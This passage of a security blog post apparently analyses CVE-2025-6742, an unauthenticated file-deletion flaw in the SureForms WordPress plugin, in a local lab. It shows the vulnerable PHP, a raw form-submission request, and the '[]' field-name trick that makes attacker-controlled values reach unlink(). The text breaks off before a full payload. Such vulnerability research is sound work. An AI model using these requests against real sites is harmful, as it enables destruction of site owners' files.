class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;If&amp;ensp;the&amp;ensp;file&amp;ensp;URL&amp;ensp;is&amp;ensp;empty,&amp;ensp;skip&amp;ensp;to&amp;ensp;the&amp;ensp;next&amp;ensp;iteration.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Helper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;convert_fileurl_to_filepath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;urldecode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Delete&amp;ensp;the&amp;ensp;file&amp;ensp;if&amp;ensp;it&amp;ensp;exists.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After reviewing the logic in &lt;code&gt;delete_entry_files()&lt;/code&gt;, I noticed keywords like &lt;code&gt;entries&lt;/code&gt; appear frequently. There is a coincidence here:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#34; title=&#34;Entry in UI&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry.png&#34; data-sub-html=&#34;&lt;h2&gt;Entry&lt;/h2&gt;&lt;p&gt;Entry in UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry.png&#39; alt=&#34;Entry&#34; height=&#34;636&#34; width=&#34;1342&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entry in UI&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;It seems correct, but as you can see the message &lt;code&gt;&amp;quot;No&amp;ensp;records&amp;ensp;found&amp;quot;&lt;/code&gt;, there is no data to display. So how do we add data?&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$form_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Entries&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_form_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$entry_id&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the function name &lt;code&gt;get_form_data&lt;/code&gt;, it is highly likely that data is retrieved from client form submissions since this vulnerability is published as &lt;strong&gt;Unauthenticated&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Try creating a form using the plugin functionality:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#34; title=&#34;Create form&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Create form&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;998&#34; width=&#34;1343&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create form&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Create a post and embed the form shortcode:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#34; title=&#34;Embed Shortcode&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/embed.png&#34; data-sub-html=&#34;&lt;h2&gt;Embed&lt;/h2&gt;&lt;p&gt;Embed Shortcode&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/embed.png&#39; alt=&#34;Embed&#34; height=&#34;507&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Embed Shortcode&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Access the created form and submit arbitrary data:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-json/sureforms/v1/submit-form?_locale=user&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;User-Agent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;Mozilla/5.0&amp;ensp;(Windows&amp;ensp;NT&amp;ensp;10.0;&amp;ensp;Win64;&amp;ensp;x64;&amp;ensp;rv:145.0)&amp;ensp;Gecko/20100101&amp;ensp;Firefox/145.0&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;application/json,&amp;ensp;*/*;q=0.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept-Language&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;en-US,en;q=0.7,vi;q=0.3&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;gzip,&amp;ensp;deflate,&amp;ensp;br&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Referer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;http://localhost/2025/11/19/form-testing/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;X-WP-Nonce&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;2c506366a5&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;multipart/form-data;&amp;ensp;boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;730&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Origin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;http://localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;keep-alive&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;wp-settings-time-3=1763365761&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec-Fetch-Dest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;empty&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec-Fetch-Mode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;cors&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Sec-Fetch-Site&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;same-origin&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;X-PwnFox-Color&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;blue&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Priority&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;u=0&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;sureforms_form_submit&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;d3b9273370&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;_wp_http_referer&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/2025/11/19/form-testing/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;form-id&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;123&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;srfm-sender-email-field&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;testing&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221--&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#34; title=&#34;Submit form from Unauthenticated user&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/submit.png&#34; data-sub-html=&#34;&lt;h2&gt;Capture request&lt;/h2&gt;&lt;p&gt;Submit form from Unauthenticated user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/submit.png&#39; alt=&#34;Capture request&#34; height=&#34;861&#34; width=&#34;1496&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Submit form from Unauthenticated user&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The response returns several fields such as &lt;strong&gt;status&lt;/strong&gt; and &lt;strong&gt;submission id&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The name &lt;code&gt;delete_entry_files&lt;/code&gt; refers to deleting an entry, so let’s set a breakpoint at the start of the function and try deleting an entry.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; title=&#34;Debugger when entry is deleted&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/entry_del.gif&#34; data-sub-html=&#34;&lt;h2&gt;Entry Delete&lt;/h2&gt;&lt;p&gt;Debugger when entry is deleted&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/entry_del.gif&#39; alt=&#34;Entry Delete&#34; height=&#34;1082&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger when entry is deleted&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Continue debugging&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#34; title=&#34;Value of $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Value of $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value.png&#39; alt=&#34;Value&#34; height=&#34;747&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $value&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;We see &lt;code&gt;$value&lt;/code&gt; is attacker-controlled. &lt;code&gt;$value&lt;/code&gt; needs to be an array so it won’t be skipped by &lt;code&gt;continue&lt;/code&gt; and so &lt;code&gt;file_exists()&lt;/code&gt; can be invoked.&lt;/p&gt;&#xA;&lt;p&gt;To make &lt;code&gt;$value&lt;/code&gt; an array, submit a field whose name ends with &lt;code&gt;[]&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------geckoformboundary951e0587d59c442ebcc7cae9dcac2221&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Disposition:&amp;ensp;form-data;&amp;ensp;name=&amp;#34;srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]&amp;#34;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;testing&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#34; title=&#34;Value of $value&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/value1.png&#34; data-sub-html=&#34;&lt;h2&gt;Value&lt;/h2&gt;&lt;p&gt;Value of $value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/value1.png&#39; alt=&#34;Value&#34; height=&#34;891&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of $value&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 